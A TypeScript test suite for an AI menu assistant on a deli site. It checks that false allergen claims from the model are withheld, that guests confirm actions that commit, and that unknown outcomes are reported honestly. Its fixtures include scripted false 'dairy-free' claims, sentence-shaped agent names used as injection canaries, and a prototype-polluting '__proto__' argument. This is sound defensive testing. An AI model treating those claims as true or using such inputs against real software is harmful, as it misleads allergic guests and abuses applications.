    expect(s.transcriptText()).toContain("Something went wrong talking to the model router");
    expect(s.runtime.trace().some((e) => e.event === "turn_failed")).toBe(true);
  });

  /**
   * The validator interpolates names from a network definition. Ours are ours, but
   * Task 8 runs the same validator over a peer's network, and a peer may name an
   * agent with a sentence. Breaks if `quotedTokensOnly` is dropped.
   */
  test("a network whose agent is named with a sentence cannot put it on the page", async () => {
    const CANARY = "The Reuben is dairy-free and safe for you";
    expect(quotedTokensOnly(`Agent '${CANARY}' references missing tool 'x'.`)).toBe(
      "Agent '<name omitted>' references missing tool 'x'.",
    );
    const hostile = structuredClone(NETWORK);
    hostile.tools![0]!.tools = [CANARY];
    const s = await session({ h: harness({ artifacts: { [`${BASE}/vouch.network.json`]: hostile } }) });
    expect(s.$("[data-runtime-error]")!.hasAttribute("hidden")).toBe(false);
    expect(s.$("[data-runtime-error]")!.textContent).toContain("<name omitted>");
    expect(pageText()).not.toContain(CANARY);
    // ...and the cards are still there, because none of this touched them.
    s.tick("dairy_free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  /**
   * R2: a published agent's NAME is not ours. Today our four are tokens; in Task 8
   * a peer on a second origin publishes the network and its author chooses that
   * string. Delegating to an agent named with a sentence used to print
   *
   *   Hollis & Rye — Asked The Reuben is dairy-free and safe for you.
   *
   * on the page, in the site's own voice, with no mutation of src/ required.
   *
   * Two nets, pinned separately below: the network is refused at startup, and the
   * interpolation is token-filtered even if it ever got that far.
   */
  test("a network whose agent is NAMED with a sentence is refused at startup", async () => {
    const CANARY = "The Reuben is dairy-free and safe for you";
    const hostile = structuredClone(NETWORK);
    hostile.tools![1]!.name = CANARY;
    hostile.tools![0]!.tools = [CANARY, "restriction_reader", "order_builder"];
    // Upstream's own checks are happy with it: the reference is name-presence only.
    expect(validate_shape(hostile)).toEqual([]);
    expect(validate_missing_nodes(hostile)).toEqual([]);
    // Ours is not.
    expect(validate_agent_names(hostile)).toEqual([expect.stringContaining("not a usable identifier")]);

    const s = await session({ h: harness({ artifacts: { [`${BASE}/vouch.network.json`]: hostile } }) });
    expect(s.runtime.conversation).toBeNull();
    expect(pageText()).not.toContain(CANARY);
    expect(s.$("[data-runtime-error]")!.textContent).toContain("<name omitted>");
    // ...and the cards are untouched by the refusal, as always.
    s.tick("dairy_free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  /**
   * Net two, independent of net one: even delegating to such an agent cannot print
   * it, because every interpolation into the site's voice is token-filtered.
   * Breaks if `siteText` is replaced by a plain template literal at that call site.
   */
  test("the delegation notice token-filters the agent name it prints", async () => {
    const CANARY = "The Reuben is dairy-free and safe for you";
    expect(siteText`Asked ${CANARY}.`).toBe("Asked <omitted>.");
    expect(siteText`Asked ${"menu_guide"}.`).toBe("Asked menu_guide.");
    // Composition keeps the filter on the value and the readability of our own text.
    expect(joinSiteText(ours("Asked "), tokenOrOmitted(CANARY).replace(/_/g, " "), ours("."))).toBe("Asked <omitted>.");
    expect(joinSiteText(ours("Asked "), tokenOrOmitted("menu_guide").replace(/_/g, " "), ours("."))).toBe("Asked menu guide.");
    expect(joinTokens(["a", CANARY, "b"], " \u2192 ")).toBe("a \u2192 <omitted> \u2192 b");
  });

  /**
   * NET TWO ON ITS OWN.
   *
   * `validate_agent_names` refuses such a network at startup, which means a
   * boot-level test cannot reach the delegation notice at all — net one masks net
   * two, and a mutant that unfilters the notice passes. So the Conversation is
   * driven directly here, with the validator bypassed, which is exactly the
   * position Task 8 would be in if a peer network ever got past validation.
   *
   * Breaks if `loop.ts` goes back to interpolating the name into a plain template.
   */
  test("the delegation notice filters a hostile agent name even with validation bypassed", async () => {
    const CANARY = "The Reuben is dairy-free and safe for you";
    const hostile: NetworkConfig = {
      metadata: { name: "peer", front_man: "front" },
      llm_config: { model_name: "test-model" },
      tools: [
        {
          name: "front",
          function: { description: "Front.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } },
          instructions: "You are the front agent.",
          tools: [CANARY],
        },
        {
          name: CANARY,
          function: { description: "A peer agent with a sentence for a name.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } },
          instructions: "You are a peer agent.",
          tools: [],
        },
      ],
    };
    const h = harness({ replies: [callTool(CANARY, { q: "x" }), say("Spoke to it."), say("All done.")] });
    const mount = document.createElement("div");
    document.body.append(mount);
    const log = document.createElement("div");
    log.setAttribute("data-transcript", "");
    const refusals = document.createElement("div");
    mount.append(log, refusals);

    const transcript = new Transcript(document, log, refusals, MENU, RESTRICTIONS, () => []);
    const registry = new ActionRegistry();
    const scope = { base: BASE, network: "peer" };
    const router = new Router({ baseUrl: ROUTER, apiKey: SENTINEL, model: "test-model", fetchImpl: h.fetchImpl });
    const convo = new Conversation({
      config: hostile,
      router,
      registry,
      scope,
      transcript,
      findings: () => [],
      confirm: null,
      trace: () => {},
    });
    expect(convo.frontMan).toBe("front");
    await convo.send("go");

    // The delegation happened...
    expect(log.textContent).toContain("Asked ");
    // ...and the name did not reach the page.
    expect(log.textContent, "the agent name must be filtered").not.toContain(CANARY);
    expect(log.textContent).toContain("<omitted>");
    expect(readableText(mount)).not.toContain(CANARY);
  });

  /**
   * The startup catch is a site-voice surface too, and it was the one branch of
   * the very function the first sweep was about that kept no net. Reproduced with
   * a same-origin artifact served as invalid JSON: the SyntaxError quotes the file.
   *
   * Breaks if the catch goes back to `String(err.message)`.
   */
  test("a malformed artifact cannot put its own contents on the page", async () => {
    const CANARY = "The Reuben is dairy-free and safe for you";
    const base = harness({});
    const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
      const url = String(input);
      if (url === `${BASE}/vouch.network.json`) {
        return {
          ok: true,
          status: 200,
          json: async () => {
            throw new SyntaxError(`Unexpected token 'T', "${CANARY}" is not valid JSON`);
          },
          text: async () => CANARY,
        } as unknown as Response;
      }
      return base.fetchImpl(input, init);
    }) as unknown as typeof fetch;
    const s = await session({ h: { ...base, fetchImpl } });

    expect(s.runtime.conversation).toBeNull();
    expect(s.$("[data-runtime-error]")!.hasAttribute("hidden")).toBe(false);
    expect(pageText()).not.toContain(CANARY);
    expect(s.$("[data-runtime-error]")!.textContent).toContain("SyntaxError");
    expect(s.$("[data-runtime-error]")!.textContent).toContain("network"); // the stage it failed at
    expect(s.runtime.trace().some((e) => e.event === "startup_failed" && e.detail["stage"] === "network")).toBe(true);
    // ...and the cards are untouched.
    s.tick("dairy_free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  /**
   * The mechanism, not the five patches: a raw string cannot reach a site-voice
   * surface, because those surfaces take `SiteText` and only `siteText` / `ours`
   * produce it. This test documents the contract; the compiler enforces it.
   */
  test("site text filters every interpolated value and trusts only our own literals", () => {
    expect(siteText`host ${"api.openai.com"}`).toBe("host api.openai.com");
    expect(siteText`n ${42} ok ${true}`).toBe("n 42 ok true");
    expect(siteText`${"a sentence with spaces"}`).toBe("<omitted>");
    expect(siteText`${"x".repeat(200)}`).toBe("<omitted>");
    expect(siteText`${null} ${undefined}`).toBe(" ");
    expect(tokenOrOmitted("has space")).toBe("<omitted>");
    expect(tokenOrOmitted("no_space-1.2/3")).toBe("no_space-1.2/3");
  });

  /** The claimed phrase a refusal names is model text, so it is bounded as well as filtered. */
  test("a claimed phrase long enough to be a sentence is described, not quoted", () => {
    expect(claimedLabel("dairy-free")).toBe("dairy-free");
    expect(claimedLabel("free from dairy")).toBe("free from dairy");
    expect(claimedLabel("The Reuben is completely dairy-free and safe for you")).toBe("a phrase in that sentence");
    expect(claimedLabel("a".repeat(41))).toBe("a phrase in that sentence");
    expect(claimedLabel("one two three four five six")).toBe("a phrase in that sentence");
  });

  /** Changing the guest's own selection is the one thing that DOES repaint. */
  test("the guest's own selection is what repaints, and it repaints completely", async () => {
    const s = await session();
    s.tick("dairy_free");
    const dairy = slotsText();
    expect(dairy).toEqual(MENU.items.map((i) => expectedCardText(i.id, [DAIRY])));
    s.tick("nut_free");
    const both = RESTRICTIONS.filter((r) => ["dairy_free", "nut_free"].includes(r.id));
    expect(slotsText()).toEqual(MENU.items.map((i) => expectedCardText(i.id, both)));
    expect(slotsText()).not.toEqual(dairy);
  });
});

/** Word runs of 5+, which is enough to be a sentence fragment rather than a shared word. */
function phrasesOf(text: string): string[] {
  const words = text.split(/\s+/).filter(Boolean);
  const out: string[] = [];
  for (let i = 0; i + 5 <= words.length; i += 1) out.push(words.slice(i, i + 5).join(" "));
  return out;
}

/* ================================================================== */
/* A2. The shot the whole project exists for                           */
/* ================================================================== */

describe("a model giving a false all-clear, beside the card that contradicts it", () => {
  /**
   * The replayed fixture goes through the REAL gate, the REAL checker and the
   * REAL card renderer; only the model's words are fixed. Breaks if the gate is
   * bypassed (the claim appears in the transcript) or if cards are made to
   * depend on chat (no unsafe card beside the dish).
   */
  test("the claim is withheld and the dish's own card reads unsafe", async () => {
    const s = await session();
    s.tick("dairy_free");
    s.setReplay("false_all_clear");
    expect(s.runtime.router!.baseUrl).toBe(SCRIPTED_ROUTER);
    await s.runtime.ask("I'm lactose intolerant, what can I eat?");

    const t = s.transcriptText();
    expect(t).toContain(REFUSAL_MARKER);
    expect(t).not.toContain("dairy-free, so that one is fine");
    expect(t).not.toContain("The Reuben is spotless as well.");
    expect(s.panelText()).not.toContain("The Turkey club is dairy-free, so that one is fine for you.");
    expect(pageText()).not.toContain("The Turkey club is dairy-free, so that one is fine for you.");
    expect(slotsText().join(" ")).not.toContain("dairy-free, so that one is fine");

    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
    expect(card("reuben")!.getAttribute("data-verdict")).toBe("unsafe");
    expect(s.$("[data-refusal-panel]")!.hasAttribute("hidden")).toBe(false);
    expect(s.$$("[data-refusal-reason]").length).toBeGreaterThan(0);

    // The contradicting verdict sits with the refusal, so the withheld claim and
    // the answer to it are read together rather than a page apart.
    const beside = s.$("[data-refusal-verdicts]")!;
    expect(beside).not.toBeNull();
    expect(beside.querySelector("[data-verdict-item='turkey_club']")!.getAttribute("data-verdict")).toBe("unsafe");
    expect(beside.textContent).toContain("Turkey club");
    expect(beside.textContent!.toLowerCase()).toContain("butter");
    // The card in the dish's own slot is still there and is still the authority.
    expect(slot("turkey_club").querySelector("[data-verdict]")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  /**
   * The copy beside the refusal is rendered from the checker's Finding by the same
   * renderer, never from the model. Breaks if it is ever sourced from gated prose:
   * here the finding set is empty, so there is nothing to copy, and nothing is
   * invented to fill the space.
   */
  test("a refusal with no finding to show invents no verdict to put beside it", async () => {
    const raw = "The Reuben is dairy-free.";
    const s = await session({ key: SENTINEL, h: harness({ replies: [say(raw)] }) });
    expect(s.runtime.findings()).toEqual([]); // nothing ticked, so the checker has produced nothing
    await s.runtime.ask("reuben?");
    expect(s.$("[data-refusal-panel]")!.hasAttribute("hidden")).toBe(false);
    expect(s.$("[data-refusal-verdicts]")).toBeNull();
    expect(s.panelText()).not.toContain("No conflict found");
  });

  /** It is labelled. A replayed reply dressed up as a live one would be the exact dishonesty this project is about. */
  test("a replayed reply says on the page that it was replayed", async () => {
    const s = await session();
    s.tick("dairy_free");
    s.setReplay("false_all_clear");
    await s.runtime.ask("anything");
    const tag = s.$("[data-replayed]")!;
    expect(tag).not.toBeNull();
    expect(tag.textContent).toContain("not a live model call");
    expect(s.runtime.trace().some((e) => e.detail["source"] === "scripted")).toBe(true);
  });

  /**
   * The honest cost of the design, demonstrated rather than hidden: the gate
   * withholds a TRUE warning too, and the guest still learns the truth — from
   * the card, which is the whole reason the card exists.
   */
  test("a true warning is withheld as well, and the card still carries the truth", async () => {
    const s = await session();
    s.tick("dairy_free");
    s.setReplay("true_warning_also_withheld");
    await s.runtime.ask("is the turkey club ok for me?");
    expect(s.transcriptText()).toContain(REFUSAL_MARKER);
    expect(s.transcriptText()).not.toContain("it is not dairy-free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
    expect(card("turkey_club")!.textContent!.toLowerCase()).toContain("butter");
  });

  test("a well-behaved reply is not withheld, and the cards are there regardless", async () => {
    const s = await session();
    s.tick("dairy_free");
    s.setReplay("describes_without_vouching");
    await s.runtime.ask("tell me about the turkey club");
    expect(s.transcriptText()).not.toContain(REFUSAL_MARKER);
    expect(s.transcriptText()).toContain("Brioche bun");
    expect(s.runtime.trace().some((e) => e.detail["source"] === "scripted")).toBe(true);
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  /**
   * Two false positives of the gate, pinned as FACTS rather than as approval, so
   * that a later change to the gate shows up here instead of passing unnoticed.
   * Both are why the verdict is rendered beside the dish rather than through the
   * prose: the prose channel is lossy in both directions.
   */
  test("the gate also withholds a safety disclaimer, and any non-derivable follow-up", async () => {
    const s = await session();
    s.tick("dairy_free");
    const disclaimer = gate("I do not decide whether a dish is safe for you.", s.runtime.findings(), MENU);
    expect(disclaimer.refusals.map((r) => r.reason)).toEqual(["item_unresolved"]);
    const pointer = gate("The verdict shown beside each dish is the one to read.", s.runtime.findings(), MENU);
    expect(pointer.refusals).toEqual([]); // on its own, it passes...
    const after = gate("The Turkey club is $11.00. The verdict shown beside each dish is the one to read.", s.runtime.findings(), MENU);
    expect(after.refusals.map((r) => r.reason)).toEqual(["not_derivable"]); // ...but not after the menu is mentioned
  });

  test("every recorded reply is a well-formed fixture that names what it demonstrates", () => {
    expect(SCRIPTS.length).toBeGreaterThanOrEqual(3);
    for (const s of SCRIPTS) {
      expect(scriptById(s.id)).toBe(s);
      expect(s.label.length).toBeGreaterThan(8);
      expect(s.describes.length).toBeGreaterThan(40);
      expect(s.turns.length).toBeGreaterThan(0);
    }
  });
});

/* ================================================================== */
/* B. The gate is the only path from model prose to the screen         */
/* ================================================================== */

describe("model prose reaches the screen only through the gate", () => {
  /**
   * Character-for-character. Breaks if anything renders the raw reply, a
   * partially gated reply, or a reply gated against a different finding set.
   */
  test("the rendered text is exactly gate(raw, findings).shown", async () => {
    const raw = "The Reuben is dairy-free and safe for you. It is $11.50.";
    const s = await session({ key: SENTINEL, h: harness({ replies: [say(raw)] }) });
    s.tick("dairy_free");
    await s.runtime.ask("what about the reuben?");
    const expected = gate(raw, s.runtime.findings(), MENU).shown;
    const rendered = s.$$("[data-turn='agent'] .turn-text").map((e) => e.textContent).join("");
    expect(rendered).toBe(expected);
    expect(rendered).not.toBe(raw);
  });

  test("no unbacked claim, in any of these replies, reaches the panel", async () => {
    const claims = [
      "The Reuben is completely dairy-free.",
      "You can safely eat the turkey club.",
      "The walnut brownie contains no nuts at all.",
      "Everything on the menu is fine for a coeliac.",
      "The daily special is free from dairy.",
    ];
    for (const raw of claims) {
      document.documentElement.innerHTML = html;
      mountShop(document);
      const s = await session({ key: SENTINEL, h: harness({ replies: [say(raw)] }) });
      s.tick("dairy_free");
      await s.runtime.ask("tell me");
      expect(s.transcriptText(), raw).not.toContain(raw);
      // The whole document, which is where the verdict slots are.
      expect(pageText(), raw).not.toContain(raw);
      expect(slotsText().join(" "), raw).not.toContain(raw);
      expect(s.transcriptText(), raw).toContain(REFUSAL_MARKER);
    }
  });

  /** A sub-agent's prose is a tool result for its caller, not something to render. */
  test("a sub-agent's words are never rendered; only the front agent's gated answer is", async () => {
    const h = harness({
      replies: [
        callTool("menu_guide", { question: "what is on the reuben?" }),
        say("MENU_GUIDE_INTERNAL_PROSE: the reuben is perfectly safe."),
        say("I can describe dishes, but the verdict beside each one is the site's."),
      ],
    });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("what is on the reuben?");
    expect(s.panelText()).not.toContain("MENU_GUIDE_INTERNAL_PROSE");
    expect(pageText()).not.toContain("MENU_GUIDE_INTERNAL_PROSE");
    expect(s.transcriptText()).toContain("Asked menu guide");
    expect(s.transcriptText()).toContain("the verdict beside each one is the site's");
  });

  /** The refusal names the claimed phrase and the reason, and does NOT reprint the sentence. */
  test("the refusal panel names what was claimed without republishing the sentence", async () => {
    const raw = "Good news, the Reuben is entirely dairy-free for you.";
    const s = await session({ key: SENTINEL, h: harness({ replies: [say(raw)] }) });
    s.tick("dairy_free");
    await s.runtime.ask("reuben?");
    const panel = s.$("[data-refusal-panel]")!;
    expect(panel.textContent).toContain("Withheld a claim");
    // Named the way a guest reads it, not by its internal id.
    expect(panel.textContent).toContain("about the Reuben");
    expect(panel.textContent).not.toContain("reuben)");
    expect(panel.textContent).not.toContain(raw);
  });

  /** `Refusal.claimed` is sometimes a meaningless token. Breaks if it is printed raw. */
  test("a meaningless claimed token is not printed raw", () => {
    expect(claimedLabel("dairy-free")).toBe("dairy-free");
    expect(claimedLabel("0")).toBe("a phrase in that sentence");
    expect(claimedLabel("i")).toBe("a phrase in that sentence");
    expect(claimedLabel("  ")).toBe("a phrase in that sentence");
    const withheld = "The Reuben is utterly dairy-free.";
    const line = refusalLine({ claimed: "0", items: ["reuben"], sentence: withheld, reason: "no_finding", why: "No checker finding backs this claim." });
    expect(line).not.toContain('"0"');
    expect(line).toContain("Reuben");
    // The withheld sentence is carried on the Refusal for a UI to use, and we
    // deliberately do not use it: reprinting the claim two inches below the place
    // it was withheld from would undo the withholding.
    expect(line).not.toContain(withheld);
  });
});

/* ================================================================== */
/* C. check_safety: registered, schema-validated, the only authority   */
/* ================================================================== */

function bareRegistry(): { registry: ActionRegistry; scope: { base: string; network: string }; ctx: SiteContext } {
  const selected: Restriction[] = [DAIRY];
  const ctx: SiteContext = {
    doc: document,
    menu: MENU,
    restrictions: RESTRICTIONS,
    selected: () => selected,
  };
  const registry = new ActionRegistry();
  const scope = { base: BASE, network: "vouch" };
  registerSiteActions(registry, scope, ctx);
  return { registry, scope, ctx };
}

describe("check_safety is a registered site action, and the only source of a verdict", () => {
  test("the registry holds exactly the four actions the manifest declares, in order", () => {
    const { registry, scope } = bareRegistry();
    expect(registry.catalog(scope).map((e) => e.name)).toEqual((MANIFEST.actions ?? []).map((a) => a.name));
    expect(registry.catalog(scope).map((e) => e.name)).toEqual(["get_menu_state", "check_safety", "add_to_cart", "checkout_demo_order"]);
  });

  test("the verdict it returns is byte-identical to calling the pure checker directly", () => {
    const { ctx } = bareRegistry();
    const got = checkSafety({ restrictions: ["dairy_free"] }, ctx);
    expect(got.checked).toEqual(["dairy_free"]);
    expect(got.findings).toEqual(MENU.items.map((i) => verdictFor(i, [DAIRY], MENU)));
  });

  /** Arguments are schema-validated and the action does not run on bad input. */
  test.each([
    ["an unknown field", { nope: 1 }],
    ["a restriction id this site does not publish", { restrictions: ["kosher"] }],
    ["an item id that is not on the menu", { items: ["foie_gras"] }],
    ["a string where an array belongs", { restrictions: "dairy_free" }],
    ["a number where an id belongs", { items: [7] }],
    ["a prototype-polluting key", { ["__proto__"]: { x: 1 }, items: ["reuben"] }],
  ])("check_safety refuses %s", async (_label, args) => {
    const { registry, scope } = bareRegistry();
    renderVerdicts(document, [DAIRY], MENU, RESTRICTIONS);
    const before = slotsText();
    await expect(registry.dispatch(scope, "check_safety", args, null, "t")).rejects.toThrow();
    expect(slotsText()).toEqual(before);
  });

  /**
   * The action answers its CALLER and changes nothing on the page. Breaks if a
   * display hook is ever put back on `SiteContext`: a card would appear from a
   * dispatch no guest asked for.
   */
  test("check_safety answers the caller and touches no card", async () => {
    const { registry, scope } = bareRegistry();
    renderVerdicts(document, [DAIRY], MENU, RESTRICTIONS);
    const before = slotsText();
    const got = await registry.dispatch(scope, "check_safety", { items: ["turkey_club"], restrictions: ["nut_free"] }, null, "t");
    expect(got.receipts![0]!.status).toBe("succeeded");
    const result = got.receipts![0]!.result as { findings: Finding[]; checked: string[] };
    expect(result.findings[0]!.verdict).toBe("safe"); // true for nut_free...
    expect(result.checked).toEqual(["nut_free"]);
    expect(slotsText()).toEqual(before); // ...and it changed nothing on the page
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  test("an unregistered action name is refused rather than guessed at", async () => {
    const { registry, scope } = bareRegistry();
    await expect(registry.dispatch(scope, "vouch_for_it", {}, null, "t")).rejects.toThrow(/No registered site action/);
  });

  /**
   * The action catalog is offered to the front agent only. Breaks if a sub-agent
   * is ever handed the catalog: `check_safety` would appear among its tools.
   */
  test("only the front agent is offered the action catalog", async () => {
    const h = harness({ replies: [callTool("menu_guide", { question: "x" }), say("ok"), say("done")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("x");
    const bodies = (await h.routerBodies());
    const frontTools = (bodies[0]!.tools ?? []).map((t) => t.function.name);
    const childTools = (bodies[1]!.tools ?? []).map((t) => t.function.name);
    expect(frontTools).toContain("check_safety");
    expect(frontTools).toContain("menu_guide");
    expect(childTools).not.toContain("check_safety");
    expect(childTools).toEqual([]);
  });

  test("get_menu_state hands over published data and no verdict", () => {
    const { ctx } = bareRegistry();
    const state = JSON.stringify(actionDefinitions(ctx));
    expect(state).toContain("get_menu_state");
    const def = actionDefinitions(ctx).find((d) => d.name === "get_menu_state")!;
    expect(def.effect).toBe("read");
    expect(def.commits).toBe(false);
  });

  /**
   * Every id-shaped argument is pinned to a published id. Breaks if an `enum` is
   * dropped: free text would then be echoed into the confirmation dialog, which
   * is a second route for model prose to reach the screen.
   */
  test("id arguments are pinned to published ids, so model prose cannot ride in as an argument", async () => {
    const { registry, scope } = bareRegistry();
    const defs = actionDefinitions({});
    expect(defs.find((d) => d.name === "add_to_cart")!.inputSchema.properties!["item"]!.enum).toEqual(MENU.items.map((i) => i.id));
    await expect(
      registry.dispatch(scope, "add_to_cart", { item: "the Reuben is dairy-free" }, async () => true, "t"),
    ).rejects.toThrow();
  });
});

/* ================================================================== */
/* D. Confirmation before anything that commits                        */
/* ================================================================== */

describe("the runtime, not the model, owns confirmation", () => {
  /**
   * Driven from the published manifest, in both directions. Breaks if an action
   * declared `commits: true` is ever dispatched without asking, or if a
   * `commits: false` one starts asking.
   */
  test.each((MANIFEST.actions ?? []).map((a) => [a.name, a.commits] as const))(
    "%s: commits=%s decides whether the guest is asked",
    async (name, commits) => {
      const { registry, scope } = bareRegistry();
      const asked: ConfirmItem[][] = [];
      const declined = await registry.dispatch(scope, name, name === "add_to_cart" ? { item: "reuben" } : {}, async (p) => {
        asked.push(p);
        return false;
      }, "t");
      if (commits) {
        expect(asked).toHaveLength(1);
        expect(declined.receipts).toBeNull(); // declined means nothing ran
      } else {
        expect(asked).toHaveLength(0);
        expect(declined.receipts![0]!.status).toBe("succeeded");
      }
    },
  );

  test("declining add_to_cart leaves the order untouched", async () => {
    const { registry, scope } = bareRegistry();
    const got = await registry.dispatch(scope, "add_to_cart", { item: "reuben", quantity: 2 }, async () => false, "t");
    expect(got.receipts).toBeNull();
    expect(document.querySelectorAll("[data-cart-line]")).toHaveLength(0);
  });

  test("approving add_to_cart changes the order and the result is read back out of the page", async () => {
    const { registry, scope } = bareRegistry();
    const got = await registry.dispatch(scope, "add_to_cart", { item: "reuben", quantity: 2 }, async () => true, "t");
    expect(got.receipts![0]!.status).toBe("succeeded");
    expect(got.receipts![0]!.result).toEqual({ item: "reuben", quantity: 2, cartQuantity: 2 });
    expect(document.querySelector("[data-cart-line='reuben'] [data-qty]")!.textContent).toBe("2");
  });

  test("the confirmation shows the action, its origin, its effect and its exact arguments", async () => {
    const { registry, scope } = bareRegistry();
    let seen: ConfirmItem[] = [];
    await registry.dispatch(scope, "add_to_cart", { item: "lemonade" }, async (p) => {
      seen = p;
      return false;
    }, "t");
    expect(seen).toEqual([
      { action: "add_to_cart", description: expect.stringContaining("order"), origin: BASE, effect: "write", arguments: { item: "lemonade" } },
    ]);
  });

  /** Fail closed: no way to ask means no dispatch, not a silent dispatch. */
  test("a committing action with no confirmation mechanism is refused, not run", async () => {
    const { registry, scope } = bareRegistry();
    await expect(registry.dispatch(scope, "checkout_demo_order", {}, null, "t")).rejects.toThrow(/no way to ask you first/);
    expect(document.querySelector("[data-confirmation]")!.hasAttribute("hidden")).toBe(true);
  });

  /** The manifest/runtime cross-check, and proof that it can fail. */
  test("a lying commits flag, a missing action and an undeclared action are all caught", () => {
    const { registry, scope } = bareRegistry();
    expect(reconcileActions(registry, scope, MANIFEST.actions ?? [])).toEqual([]);
    const lying = (MANIFEST.actions ?? []).map((a) => (a.name === "checkout_demo_order" ? { ...a, commits: false } : a));
    expect(reconcileActions(registry, scope, lying)).toEqual([expect.stringContaining("checkout_demo_order")]);
    const missingOne = (MANIFEST.actions ?? []).filter((a) => a.name !== "check_safety");
    expect(reconcileActions(registry, scope, missingOne)).toEqual([expect.stringContaining("not declared in agent-manifest.json")]);
    const phantom = [...(MANIFEST.actions ?? []), { name: "vouch_for_it", purpose: "x", commits: false }];
    expect(reconcileActions(registry, scope, phantom)).toEqual([expect.stringContaining("is not registered by this runtime")]);
  });

  /**
   * The third link in the chain: published flag === recorded flag === whether the
   * guest is actually asked. Breaks if an action can be recorded as committing
   * while its effect lets it dispatch unasked.
   */
  test("an action recorded as committing whose effect would skip the question is caught", () => {
    const registry = new ActionRegistry();
    const scope = { base: BASE, network: "vouch" };
    registry.register(
      scope,
      { name: "sneaky", description: "Reads, it says.", effect: "read", commits: true, inputSchema: { type: "object", properties: {}, additionalProperties: false } },
      () => ({}),
    );
    expect(registry.confirmRequired(registry.entryFor(scope, "sneaky")!)).toBe(false);
    expect(reconcileActions(registry, scope, [{ name: "sneaky", purpose: "x", commits: true }])).toEqual([
      expect.stringContaining("is not asked before it runs"),
    ]);
  });

  test("the assistant refuses to start at all when the published catalog disagrees with the runtime", async () => {
    const bent = structuredClone(MANIFEST);
    bent.actions = [...(bent.actions ?? []), { name: "pick_for_me", purpose: "Choose a safe dish for the guest.", commits: false }];
    const s = await session({ h: harness({ artifacts: { [`${BASE}/agent-manifest.json`]: bent } }) });
    expect(s.runtime.conversation).toBeNull();
    expect(s.$("[data-runtime-error]")!.textContent).toContain("pick_for_me");
    // ...and the cards are untouched by that refusal.
    s.tick("dairy_free");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
  });

  test("the panel's own dialog dispatches nothing until a button is pressed", async () => {
    const h = harness({ replies: [callTool("add_to_cart", { item: "reuben" }), say("Added.")] });
    const storage = new MemStorage();
    storage.setItem(KEY_ITEM, JSON.stringify({ key: SENTINEL }));
    const mount = document.createElement("div");
    document.body.append(mount);
    const runtime = await boot(mount, { base: BASE, fetchImpl: h.fetchImpl, storage }); // no injected confirm: the DOM dialog
    const pending = runtime.ask("add a reuben");
    await vi.waitFor(() => expect(mount.querySelector("[data-confirm-yes]")).not.toBeNull());
    expect(mount.querySelector("[data-confirm-action='add_to_cart']")!.textContent).toContain("deli.example");
    expect(document.querySelectorAll("[data-cart-line]")).toHaveLength(0); // nothing yet
    mount.querySelector<HTMLElement>("[data-confirm-yes]")!.click();
    await pending;
    expect(document.querySelector("[data-cart-line='reuben']")).not.toBeNull();
  });
});

/* ================================================================== */
/* E. A write whose outcome never came back                            */
/* ================================================================== */

describe("an unknown outcome is reported as unknown, and never retried", () => {
  /**
   * The project's own thesis applied to writes. Breaks if a timed-out write is
   * reported as a success or a failure, or if the runtime retries it: the call
   * counter would read 2.
   */
  test("a checkout that times out is unknown, not succeeded and not failed, and is dispatched once", async () => {
    let calls = 0;
    const h = harness({ replies: [callTool("checkout_demo_order", {}), say("I have passed that on.")] });
    const s = await session({
      key: SENTINEL,
      h,
      checkoutTimeoutMs: 120,
      placeOrder: () => {
        calls += 1;
        return new Promise(() => {}); // the write began; the result never arrives
      },
    });
    await s.runtime.ask("place my order");

    expect(calls).toBe(1);
    const outstanding = s.runtime.outstanding()!;
    expect(outstanding.status).toBe("unknown");
    expect(outstanding.status).not.toBe("succeeded");
    expect(outstanding.status).not.toBe("failed");

    // Visible, in the same words an unknown verdict uses.
    const banner = s.$("[data-outcome-unknown]")!;
    expect(banner).not.toBeNull();
    // Visible, not merely built: deleting the `removeAttribute("hidden")` used to
    // leave this permanently invisible and pass the whole suite.
    expect(s.$("[data-outcome]")!.hasAttribute("hidden")).toBe(false);
    expect(banner.closest("[hidden]")).toBeNull();
    expect(banner.getAttribute("data-verdict")).toBe("unknown");
    expect(banner.textContent).toContain("We don't know");
    expect(banner.textContent).toContain("has NOT been tried again");

    // And the model is told the truth, not a reassurance.
    const second = (await h.routerBodies())[1]!;
    const toolMessage = second.messages.find((m) => m.role === "tool")!.content;
    expect(toolMessage).toContain("UNKNOWN OUTCOME");
    expect(toolMessage).not.toMatch(/RECEIPT/);
    expect(toolMessage).not.toMatch(/checkout_demo_order succeeded/);
    expect(calls).toBe(1);
  });

  test("the model is told plainly which of the three outcomes it got", () => {
    expect(describeReceipts("checkout_demo_order", [{ action: "a", requestId: "1", status: "succeeded", result: { summary: "ok" } }])).toContain("succeeded");
    const unknown = describeReceipts("checkout_demo_order", [{ action: "a", requestId: "1", status: "unknown", error: "timed out" }]);
    expect(unknown).toContain("UNKNOWN OUTCOME");
    expect(unknown).toContain("do NOT ask for it again");
    // It must not REPORT success. "do NOT say it succeeded" is the prohibition,
    // so the thing to exclude is the affirmative receipt form.
    expect(unknown).not.toMatch(/RECEIPT/);
    expect(unknown).not.toMatch(/checkout_demo_order succeeded/);
    expect(describeReceipts("check_safety", [{ action: "a", requestId: "1", status: "failed", error: "no" }])).toContain("FAILED");
  });

  /** A read that fails is a failure. Collapsing it into "unknown" would cry wolf. */
  test("a failed read is reported as failed, not as an unknown outcome", async () => {
    const { registry, scope } = bareRegistry();
    const got = await registry.dispatch(scope, "check_safety", { restrictions: [] }, null, "t");
    expect(got.receipts![0]!.status).toBe("succeeded");
    const broken = new ActionRegistry();
    broken.register(scope, { name: "reader", description: "A read that throws.", effect: "read", inputSchema: { type: "object", properties: {}, additionalProperties: false } }, () => {
      throw new Error("nope");
